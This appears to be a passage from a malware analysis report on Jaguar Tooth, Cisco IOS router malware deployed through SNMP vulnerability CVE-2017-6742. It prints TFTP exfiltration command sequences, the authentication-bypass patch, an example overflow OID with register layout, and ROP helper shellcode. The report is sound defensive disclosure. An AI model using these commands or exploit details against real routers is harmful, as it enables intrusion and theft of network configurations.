**Functionality**

**Overview**

Jaguar Tooth is composed of a number of payloads and patches, the deployment of which is\
described in the ‘SNMP exploit’ section of this report.

It enables unauthenticated backdoor access by patching Cisco IOS authentication routines. This\
grants access to existing local accounts without checking the provided password, when connecting\
via Telnet or physical session. Further details are discussed in the ‘Functionality (Unauthenticated\
backdoor)’ section of this report.

The malware also creates a new process, called Service Policy Lock, that automatically collects\
information and exfiltrates it over TFTP. This includes device information such as the running\
configuration, firmware version, directory listing of flash memory, and network information including\
the Address Resolution Protocol (ARP) and routing tables, interfaces and other connected routers.\
Further details are discussed in the ‘Functionality (Device information exfiltration)’ section of this\
report.

**Unauthenticated backdoor**

Jaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any\
local account for any provided password via Telnet and physical sessions. This is achieved by\
patching askpassword and ask\_md5secret to always return true without checking the provided\
password.

**Device information exfiltration**

Jaguar Tooth collects and exfiltrates a variety of device information which is gathered using the\
following Cisco IOS Command Line Interface (CLI) commands:

* show running-config
* show version
* show ip interface brief
* show arp
* show cdp neighbors
* show start
* show ip route
* show flash

Specifically, Jaguar Tooth executes the following shortened Cisco IOS CLI and Tcl commands,\
exfiltrating the information over TFTP using the redirect, i.e. r, command:

* sleep 5000
* enable
* sh run | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh ver | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh ip int bri | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh arp | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh cdp neig | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh start | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh ip ro | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* sh fla | r tftp://\[IP ADDRESS]/\[URL PAGE]
* sleep 5000
* disable
* tclquit

**SNMP exploit**

**Overview**

Jaguar Tooth is deployed via exploitation of the patched SNMP vulnerability CVE- 2017 - 6742. This\
vulnerability was first announced by Cisco on the 29th June 2017, covered under Cisco bug ID\
CSCve54313, with the fixed software being made available. Additionally, the Cisco published advisory\
included details of workarounds, including through limiting access to SNMP from trusted hosts only, or\
by disabling several SNMP MIBs.

This vulnerability causes a stack-based buffer to be overflowed, enabling control of the instruction\
pointer which can be used to gain remote code execution. This exploit uses Return Oriented\
Programming (ROP) to overwrite operating system memory and incrementally deploy the malware\
code over hundreds of iterations.

The vulnerable function targeted by this exploit is reached using the SNMP Object Identifier (OID)\
1.3.6.1.4.1.9.9.95.1.2.4.1.3, which corresponds to alpsRemPeerConnLocalPort. By\
appending additional bytes to the end of the OID, a stack-based buffer can be overflowed.

One of the side-effects of this vulnerability is that any ASCII characters in the additional OID bytes are\
converted to uppercase, which constrains what data can be written and where. See the ‘SNMP exploit\
(Buffer overflow)’ section of this report for further details.

Jaguar Tooth is deployed by writing custom shellcode to memory which can be used to write an\
arbitrary 4-byte value to any specified address. This shellcode is then called repeatedly to\
incrementally write Jaguar Tooth into memory. This is described in the ‘SNMP exploit (Copy payload)’\
section of this report.

Once the Jaguar Tooth payloads have been copied into memory, they are individually executed by\
overflowing the return address of the vulnerable function with their location in memory.

**Buffer overflow**

The OID used by the SNMP exploit can be broken down as follows:

* 1 - iso
* 3 - org
* 6 - dod
* 1 - internet
* 4 - private
* 1 - enterprise
* 9 - cisco
* 9 - ciscoMgmt
* 95 - ciscoAlpsMIB
* 1 - ciscoAlpsMIBObjects
* 2 - alpsPeerObjects
* 4 - alpsRemPeerConnTable
* 1 - alpsRemPeerConnEntry
* 3 - alpsRemPeerConnLocalPort

The vulnerability occurs within k\_alpsRemPeerConnEntry\_get (0x60E72178), part of AirLine

Protocol Support (ALPS), where a long enough OID causes a stack-based buffer overflow that allows\
control of registers including the instruction pointer.

The registers that are controllable are those that are saved on the stack which are then restored in the\
function epilogue as follows:

```
seg000:60E7258C lw $ra, 0x50($sp)
seg000:60E72590 lw $s7, 0x4C($sp)
seg000:60E72594 lw $s6, 0x48($sp)
seg000:60E72598 lw $s5, 0x44($sp)
seg000:60E7259C lw $s4, 0x40($sp)
seg000:60E725A0 lw $s3, 0x3C($sp)
seg000:60E725A4 lw $s2, 0x38($sp)
seg000:60E725A8 lw $s1, 0x34($sp)
seg000:60E725AC lw $s0, 0x30($sp)
seg000:60E725B0 jr $ra
seg000:60E725B4 addiu $sp, 0x
```

A full exploit OID looks similar to the following:

1.3.6.1.4.1.9.9.95.1.2.4.1.3.69.65.65.65.65.65.65.65.65.65.65.65.65.65.65.\
65.65.65.65.65.65.65.65.65.65.65.65.65.65.S0.S0.S0.S0.S1.S1.S1.S1.S2.S2.S2.\
S2.S3.S3.S3.S3.S4.S4.S4.S4.S5.S5.S5.S5.S6.S6.S6.S6.S7.S7.S7.S7.RA.RA.RA.RA.\
65.65.65.65.

Once converted to hexadecimal, ignoring the common 1.3.6 prefix, the underlying data in relation to\
the stack is then as follows:

```
Raw OID bytes
```

```
01 04 01 09 09 5F 01 02 04 01 03 45 41 41 41 41
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 S0 S 0 S 0 S 0 S1 S1 S1 S
S2 S2 S2 S2 S 3 S 3 S 3 S 3 S 4 S 4 S 4 S 4 S5 S5 S5 S
S6 S6 S6 S6 S 7 S 7 S 7 S 7 RA RA RA RA 41 41 41 41
41
```

```
SNMP OID Additional bytes length Local variables padding
Overflowed registers Overflowed return address Padding
```

**SNMP uses ASN.1 to encode OIDs, resulting in multiple bytes representing integers above 127.**

The following diagram demonstrates the normal code execution flow and the return from the ROP\
gadget which calls the copy payload shellcode:

```
Figure 1: Exploit code execution flow
```

**Copy payload**

Uppercasing is disabled using multiple ROP gadgets, the main Jaguar Tooth payload is then copied\
into memory.

To facilitate this, a short piece of helper shellcode is written into memory after the code section. The\
shellcode permits an arbitrary 4 - byte value to be written to a specified address. This is then invoked\
repeatedly across multiple exploit packets in order to incrementally write Jaguar Tooth into memory.

The helper shellcode is set back to NULLs after use.

The helper shellcode is as follows:

```
seg000:81689300 sw $s0, 0($s1)
seg000:81689304 jr $s
```

Each of these registers ($s0, $s1 and $s2) are controlled, providing an arbitrary 4-byte write.

For example:

```
Raw OID bytes
```

```
01 04 01 09 09 5F 01 02 04 01 03 45 41 41 41 41
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41 03 E0 00 08 80 41 5F 44
60 E6 E6 1C 03 03 03 03 04 04 04 04 05 05 05 05
06 06 06 06 07 07 07 07 81 68 93 00 41 41 41 41
41
```

```
Register s0 Register s1 Register s
```

This will cause the shellcode to write E0 00 08 80 ($s0) to 0x80415F44 ($s1) and then jump to\
0x60E6E61C ($s2), which is the function epilogue of the outer ALPS function.

**Payload Execution**

Once written into memory, Jaguar Tooth payloads are executed by overflowing the return address of\
the vulnerable function with their location in memory.

**Conclusion**

Jaguar Tooth is non-persistent malware that targets Cisco IOS routers. Capability includes automated\
device information collection that is exfiltrated over TFTP and unauthenticated backdoor access.\
Jaguar Tooth has been observed being deployed via multiple SNMP exploit packets. Whilst the\
payloads deployed are basic, combined with the exploit this malware is assessed to be of low to\
medium sophistication.
